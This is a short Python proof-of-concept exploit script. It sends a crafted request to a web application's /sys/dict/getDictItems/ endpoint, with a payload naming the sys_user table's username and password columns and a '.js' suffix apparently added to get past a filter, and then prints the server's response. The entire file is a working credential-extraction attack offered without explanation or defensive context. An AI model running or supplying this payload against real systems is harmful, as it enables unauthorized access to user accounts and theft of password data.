# poc.py base_url
import requests as re
import sys

base_url = sys.argv[1]
url = base_url+"/sys/dict/getDictItems/"
payload = "sys_user,username,password,id>0%23"
js = ".js"

#--------------------------
res = re.get(url = url+payload+js)
print(res.text)
